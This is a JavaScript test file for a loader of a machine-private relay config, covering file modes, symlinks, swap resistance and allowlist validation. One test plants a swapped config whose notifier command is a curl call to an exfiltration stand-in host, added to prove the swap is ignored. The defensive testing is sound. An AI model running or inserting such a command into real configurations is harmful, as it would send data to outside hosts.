// The machine-private Phone relay contract: absent by default, proven on one
// descriptor, parsed once.
//
// R33 is a security rule, not a parsing convenience: the allowlist, the port and
// the notifier argv decide who may mint an authenticated phone session on this
// machine. A file another user can write, or one that can be swapped after
// validation, would decide that instead.

import assert from 'node:assert/strict';
import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';

import { loadMachineConfig, machineConfigPath } from '../src/debug-as/machine-config.mjs';

const home = () => mkdtempSync(join(tmpdir(), 'ax-machine-'));

/** Write a machine contract into `<home>/.config/ax/debug-as.json`. */
const writeContract = (root, value, { mode = 0o600 } = {}) => {
  const dir = join(root, '.config', 'ax');
  mkdirSync(dir, { recursive: true, mode: 0o700 });
  const path = join(dir, 'debug-as.json');
  writeFileSync(path, typeof value === 'string' ? value : JSON.stringify(value), { mode });
  chmodSync(path, mode);
  return path;
};

const valid = () => ({
  relayPort: 1300,
  allowedTailscaleLogins: ['operator@example.com'],
  allowedSupabaseHosts: [],
  notifier: { command: ['private-notifier'] },
});

const load = (root, options = {}) => loadMachineConfig({ home: root, env: {}, reload: true, ...options });

test('the contract is absent by default and absence is not a refusal', () => {
  const root = home();
  const answer = load(root);
  assert.equal(answer.present, false);
  assert.equal(answer.config, null);
  assert.equal(answer.path, machineConfigPath({ home: root, env: {} }));
});

test('XDG_CONFIG_HOME owns the location when it is set', () => {
  const root = home();
  const xdg = join(root, 'elsewhere');
  mkdirSync(join(xdg, 'ax'), { recursive: true, mode: 0o700 });
  writeFileSync(join(xdg, 'ax', 'debug-as.json'), JSON.stringify(valid()), { mode: 0o600 });
  const answer = loadMachineConfig({ home: root, env: { XDG_CONFIG_HOME: xdg }, reload: true });
  assert.equal(answer.present, true);
  assert.equal(answer.config.relayPort, 1300);
});

test('a valid contract normalizes logins and exposes the notifier argv', () => {
  const root = home();
  writeContract(root, { ...valid(), allowedTailscaleLogins: ['  Operator@Example.com ', 'second@example.com'] });
  const { config } = load(root);
  assert.deepEqual(config.allowedLogins, ['operator@example.com', 'second@example.com']);
  assert.deepEqual(config.notifier.command, ['private-notifier']);
  assert.deepEqual(config.allowedSupabaseHosts, []);
});

test('the parsed value is used for the process lifetime, so a swap changes neither allowlist nor notifier argv', () => {
  const root = home();
  writeContract(root, valid());
  const first = load(root).config;
  writeContract(root, {
    relayPort: 1301,
    allowedTailscaleLogins: ['attacker@example.com'],
    notifier: { command: ['curl', 'https://exfiltrate.example.com'] },
  });
  const second = loadMachineConfig({ home: root, env: {} }).config;
  assert.equal(second, first);
  assert.deepEqual(second.allowedLogins, ['operator@example.com']);
  assert.deepEqual(second.notifier.command, ['private-notifier']);
  assert.equal(second.relayPort, 1300);
});

test('the memoized value is frozen, so a caller cannot widen the allowlist in memory', () => {
  const root = home();
  writeContract(root, valid());
  const { config } = load(root);
  assert.throws(() => config.allowedLogins.push('attacker@example.com'));
  assert.throws(() => {
    config.relayPort = 1;
  });
});

const refuses = (value, at, options = {}) => {
  const root = home();
  writeContract(root, value, options);
  let error;
  assert.throws(() => load(root), err => {
    error = err;
    return err instanceof Error;
  });
  assert.equal(error.at, at);
  assert.ok(error.fix, 'every refusal names its repair');
  return error;
};

test('a group-readable or group-writable contract refuses with a mode repair', () => {
  const error = refuses(valid(), 'debug-as.json', { mode: 0o660 });
  assert.match(error.fix, /chmod 600/);
});

test('a symlinked contract refuses rather than following the link', () => {
  const root = home();
  const dir = join(root, '.config', 'ax');
  mkdirSync(dir, { recursive: true, mode: 0o700 });
  const real = join(root, 'real.json');
  writeFileSync(real, JSON.stringify(valid()), { mode: 0o600 });
  symlinkSync(real, join(dir, 'debug-as.json'));
  let error;
  assert.throws(() => load(root), err => {
    error = err;
    return err instanceof Error;
  });
  assert.match(error.problem, /symlink|link/);
  assert.ok(error.fix);
});

test('a group-writable parent directory refuses: anyone in the group could replace the contract', () => {
  const root = home();
  writeContract(root, valid());
  chmodSync(join(root, '.config', 'ax'), 0o770);
  let error;
  assert.throws(() => load(root), err => {
    error = err;
    return err instanceof Error;
  });
  assert.ok(error.fix);
  assert.match(error.at, /ax$/);
});

test('malformed JSON refuses with the path it could not parse', () => {
  refuses('{ "relayPort": ', 'debug-as.json');
});

test('an empty, wildcard, comma-joined or duplicated login refuses', () => {
  refuses({ ...valid(), allowedTailscaleLogins: [] }, 'allowedTailscaleLogins');
  refuses({ ...valid(), allowedTailscaleLogins: [''] }, 'allowedTailscaleLogins[0]');
  refuses({ ...valid(), allowedTailscaleLogins: ['*'] }, 'allowedTailscaleLogins[0]');
  refuses({ ...valid(), allowedTailscaleLogins: ['*@example.com'] }, 'allowedTailscaleLogins[0]');
  refuses({ ...valid(), allowedTailscaleLogins: ['a@example.com,b@example.com'] }, 'allowedTailscaleLogins[0]');
  refuses({ ...valid(), allowedTailscaleLogins: ['a@example.com', 'A@EXAMPLE.COM'] }, 'allowedTailscaleLogins[1]');
  refuses({ ...valid(), allowedTailscaleLogins: ['operator'] }, 'allowedTailscaleLogins[0]');
  refuses({ ...valid(), allowedTailscaleLogins: 'operator@example.com' }, 'allowedTailscaleLogins');
});

test('a privileged, ephemeral or non-integer relay port refuses', () => {
  refuses({ ...valid(), relayPort: 80 }, 'relayPort');
  refuses({ ...valid(), relayPort: 49200 }, 'relayPort');
  refuses({ ...valid(), relayPort: 1300.5 }, 'relayPort');
  refuses({ ...valid(), relayPort: '1300' }, 'relayPort');
  const absent = { ...valid() };
  delete absent.relayPort;
  refuses(absent, 'relayPort');
});

test('an unknown field refuses, because a silently ignored key is a security setting nobody applied', () => {
  refuses({ ...valid(), allowedHosts: ['x'] }, 'allowedHosts');
});

test('a Supabase allowlist entry is an exact host and port, never a wildcard or a scheme', () => {
  const root = home();
  writeContract(root, { ...valid(), allowedSupabaseHosts: ['supabase.example.ts.net:8443', 'other.example.ts.net'] });
  const { config } = load(root);
  assert.deepEqual(config.allowedSupabaseHosts, [
    { host: 'supabase.example.ts.net', port: 8443 },
    { host: 'other.example.ts.net', port: 443 },
  ]);
  refuses({ ...valid(), allowedSupabaseHosts: ['*.example.ts.net'] }, 'allowedSupabaseHosts[0]');
  refuses({ ...valid(), allowedSupabaseHosts: ['https://supabase.example.ts.net'] }, 'allowedSupabaseHosts[0]');
  refuses({ ...valid(), allowedSupabaseHosts: [''] }, 'allowedSupabaseHosts[0]');
  refuses({ ...valid(), allowedSupabaseHosts: ['a.example.ts.net', 'a.example.ts.net:443'] }, 'allowedSupabaseHosts[1]');
});

test('an empty or non-string notifier argv refuses', () => {
  refuses({ ...valid(), notifier: { command: [] } }, 'notifier.command');
  refuses({ ...valid(), notifier: { command: ['ok', 1] } }, 'notifier.command[1]');
  refuses({ ...valid(), notifier: {} }, 'notifier.command');
  refuses({ ...valid(), notifier: { command: ['ok'], extra: 1 } }, 'notifier.extra');
});

test('the notifier is optional and absent means "no notifier", not a refusal', () => {
  const root = home();
  const without = { relayPort: 1300, allowedTailscaleLogins: ['operator@example.com'] };
  writeContract(root, without);
  const { config } = load(root);
  assert.equal(config.notifier, null);
  assert.deepEqual(config.allowedSupabaseHosts, []);
});
